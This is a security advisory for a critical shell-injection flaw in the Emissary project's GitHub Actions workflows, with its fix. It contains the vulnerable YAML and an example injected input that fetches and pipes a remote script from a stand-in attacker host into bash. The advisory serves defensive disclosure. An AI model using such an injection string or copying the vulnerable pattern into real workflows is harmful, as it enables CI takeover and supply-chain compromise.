# [C] Emissary has GitHub Actions Shell Injection via Workflow Inputs

## Summary
Severity: Critical
Advisory: GHSA-3g6g-gq4r-xjm9
CVE: CVE-2026-35580
CWE: CWE-77
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-3g6g-gq4r-xjm9
Type: github-advisory

## Affected
- Maven: `gov.nsa.emissary:emissary` — affected >=0 <8.39.0

## Details
## Summary

Three GitHub Actions workflow files contained **10 shell injection points** where
user-controlled `workflow_dispatch` inputs were interpolated directly into shell
commands via `${{ }}` expression syntax. An attacker with repository write access
could inject arbitrary shell commands, leading to repository poisoning and supply
chain compromise affecting all downstream users.

## Affected Files

| Workflow file                            | Injection points |
|------------------------------------------|------------------|
| `.github/workflows/maven-version.yml`    | 4                |
| `.github/workflows/cherrypick.yml`       | 5                |
| `.github/workflows/maven-release.yml`    | 1                |

## Details

GitHub Actions `${{ }}` expressions inside `run:` blocks are substituted **before**
the shell interprets the command. When a `workflow_dispatch` input is placed directly
in a `run:` block, an attacker who can trigger the workflow can break out of the
intended command and execute arbitrary code.

### Example — `maven-version.yml` (before fix)

```yaml
- name: Set the name of the branch
  run: echo "PR_BRANCH=action/${{ github.event.inputs.next_version }}" >> "$GITHUB_ENV"
```

A malicious input such as `1.0.0"; curl attacker.com/backdoor.sh | bash; echo "`
would be interpolated directly into the shell, executing arbitrary commands with
the job's `GITHUB_TOKEN` permissions (`contents: write`, `pull-requests: write`).

### Impact

- Arbitrary code execution within the CI/CD runner
- Repository modification via the `contents: write` token (push malicious commits)
- Supply chain poisoning — downstream users who clone or build receive compromised code
- Credential exfiltration from the GitHub Actions environment

## Remediation

Fixed in two PRs merged into release 8.39.0:

### PR #1286 — Environment variable indirection

Replaced all direct `${{ inputs.* }}` interpolation in `run:` blocks with
environment variable indirection. Inputs are assigned to `env:` at the step level,
then referenced as shell variables inside `run:`.

```yaml
# After (safe — input is never interpreted by the shell parser)
- name: Set the name of the branch
  run: echo "PR_BRANCH=action/$IN_NEXT_VERSION" >> "$GITHUB_ENV"
  env:
    IN_NEXT_VERSION: ${{ github.event.inputs.next_version }}
```

### PR #1288 — Input validation

Added strict regex validation steps that run before any input is used:

- `maven-version.yml`: Validates `next_version` matches `^[a-zA-Z0-9._-]+$`
- `maven-release.yml`: Validates `release_suffix` matches `^[a-zA-Z0-9._-]+$`
- `cherrypick.yml`: Validates `commits` matches `^([0-9a-f]{7,40})(\s+[0-9a-f]{7,40})*$`

All jobs now also use `shell: bash` via `defaults.run.shell` to ensure consistent
shell behavior.

## Workarounds

There is no workaround other than upgrading. Organizations that have forked
Emissary should apply the same environment variable indirection and input
validation patterns to their workflow files.

## References

- [PR #1286 — environment variable indirection](https://github.com/NationalSecurityAgency/emissary/pull/1286)
- [PR #1288 — input validation](https://github.com/NationalSecurityAgency/emissary/pull/1288)
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- Original report: GHSA-wjqm-p579-x3ww

## References
- https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-3g6g-gq4r-xjm9
- https://nvd.nist.gov/vuln/detail/CVE-2026-35580
- https://github.com/NationalSecurityAgency/emissary/pull/1286
- https://github.com/NationalSecurityAgency/emissary/pull/1288
- https://github.com/NationalSecurityAgency/emissary
